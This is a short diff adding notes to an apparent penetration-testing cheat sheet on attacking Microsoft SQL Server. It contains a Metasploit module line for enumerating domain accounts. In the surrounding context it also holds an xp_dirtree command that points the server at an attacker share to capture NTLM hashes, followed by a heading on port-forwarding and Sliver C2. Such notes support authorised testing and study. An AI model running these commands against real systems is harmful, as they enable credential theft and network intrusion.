@@ -769,6 +769,14 @@ Catch hash from `Microsoft SQL Server 2019` method if reverse is not able to do
 EXEC master .. xp_dirtree '\\<local_machine>\Share'
 ```
 
+Domain Users enumeration by database tool `msfconsole`, set options
+
+```bash
+use auxiliary/admin/mssql/mssql_enum_domain_accounts  
+```
+
+Database enumeration https://juggernaut-sec.com/mssql/[here]
+
 [[forwarding]]
 == Port-Forwarding and Sliver C2
 
